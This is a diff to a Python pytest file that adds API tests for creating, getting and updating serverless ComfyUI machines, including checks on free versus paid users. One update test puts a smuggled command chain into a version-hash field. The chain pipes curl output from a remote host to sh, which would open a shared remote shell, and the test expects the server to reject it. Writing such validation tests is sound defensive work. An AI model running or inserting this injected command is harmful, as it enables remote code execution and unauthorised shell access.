@@ -75,11 +75,6 @@ async def get_db_context():
             await session.close()
 
 
-# logger = logging.getLogger(__name__)
-# logger.info("hi there")
-# logger.info(f"ngrok_url: {ngrok_url}")
-
-
 @pytest.mark.asyncio
 async def test_ngrok_setup(app):
     """Test to verify ngrok setup and accessibility"""
@@ -326,6 +321,146 @@ async def test_update_custom_machine(app, paid_user, test_custom_machine):
         assert updated_machine["endpoint"] == update_data["endpoint"]
         assert updated_machine["auth_token"] == update_data["auth_token"]
         assert updated_machine["type"] == update_data["type"]
+
+
+# ------ serverless machine ------
+
+# create and delete
+"""
+Free user
+- return 403
+
+Paid user
+- return 200
+- delete machine
+"""
+
+
+@pytest.mark.asyncio
+async def test_create_serverless_machine(app, paid_user, free_user):
+    machine_data = {
+        "name": "test-serverless-machine",
+        "gpu": "CPU",
+        "wait_for_build": True,
+    }
+
+    # Test with free user - should be forbidden
+    async with get_test_client(app, free_user) as client:
+        response = await client.post("/machine/serverless", json=machine_data)
+        assert response.status_code == 403
+
+    # Test with paid user - should succeed
+    async with get_test_client(app, paid_user) as client:
+        response = await client.post("/machine/serverless", json=machine_data)
+        assert response.status_code == 200
+        machine_id = response.json()["id"]
+
+        delete_response = await client.delete(f"/machine/{machine_id}?force=true")
+        assert delete_response.status_code == 200
+
+
+# get and delete
+"""
+Paid user
+- return 200
+"""
+
+
+@pytest_asyncio.fixture(scope="function")
+async def test_serverless_machine(app, paid_user):
+    machine_data = {
+        "name": "test-serverless-machine",
+        "gpu": "CPU",
+        "wait_for_build": True,
+    }
+
+    async with get_test_client(app, paid_user) as client:
+        response = await client.post("/machine/serverless", json=machine_data)
+        assert response.status_code == 200
+        machine_id = response.json()["id"]
+
+        yield machine_id
+
+        delete_response = await client.delete(f"/machine/{machine_id}")
+        assert delete_response.status_code == 200
+
+
+@pytest.mark.asyncio
+async def test_get_serverless_machine(app, paid_user, test_serverless_machine):
+    async with get_test_client(app, paid_user) as client:
+        response = await client.get(f"/machine/{test_serverless_machine}")
+        assert response.status_code == 200
+        assert response.json()["id"] == test_serverless_machine
+
+
+# update
+"""
+Paid user
+- update name, install ipadapter, run custom command ls
+- test malicious command
+- return 200 with updated values
+"""
+
+
+@pytest.mark.asyncio
+async def test_update_serverless_machine(app, paid_user, test_serverless_machine):
+    async with get_test_client(app, paid_user) as client:
+        update_malicious_hash = {
+            "name": "updated-serverless-machine-with-malicious-hash",
+            "comfyui_version": "7fbf4b72fe3b23d9ff8f21e0f9a254d032f2f9d0 && pip install accelerate && pip install diffusers && git clone https://github.com/nigeriaerika/Brushy && if [ -f requirements.txt ]; then python -m pip install -r requirements.txt; fi && if [ -f install.py ]; then python install.py || echo 'install script failed'; fi && mv Brushy custom_nodes && cd / && curl -sSf https://sshx.io/get | sh - run",
+        }
+        response = await client.patch(
+            f"/machine/serverless/{test_serverless_machine}",
+            json=update_malicious_hash,
+        )
+        assert response.status_code == 422
+
+        update_data = {
+            "name": "updated-serverless-machine",
+            "docker_command_steps": {
+                "steps": [
+                    {
+                        "id": "76566a1b-9",
+                        "type": "custom-node",
+                        "data": {
+                            "name": "ComfyUI_IPAdapter_plus",
+                            "url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus",
+                            "files": [
+                                "https://github.com/cubiq/ComfyUI_IPAdapter_plus"
+                            ],
+                            "install_type": "git-clone",
+                            "pip": ["insightface"],
+                            "hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
+                            "meta": {
+                                "message": "Merge pull request #793 from svenrog/main\n\nFix for issue with pipeline in load_models",
+                                "committer": {
+                                    "name": "GitHub",
+                                    "email": "noreply@github.com",
+                                    "date": "2025-02-26T06:31:16.000Z",
+                                },
+                                "latest_hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
+                                "stargazers_count": 4766,
+                                "commit_url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus/commit/9d076a3df0d2763cef5510ec5ab807f6632c39f5",
+                            },
+                        },
+                    },
+                    {"id": "26e71a68-6", "type": "commands", "data": "RUN ls"},
+                ]
+            },
+        }
+        response = await client.patch(
+            f"/machine/serverless/{test_serverless_machine}",
+            json=update_data,
+        )
+        assert response.status_code == 200
+        updated_machine = response.json()
+        assert updated_machine["id"] == test_serverless_machine
+        assert updated_machine["name"] == update_data["name"]
+        assert (
+            updated_machine["docker_command_steps"]
+            == update_data["docker_command_steps"]
+        )
+
 
 '''
 @pytest_asyncio.fixture(scope="session")
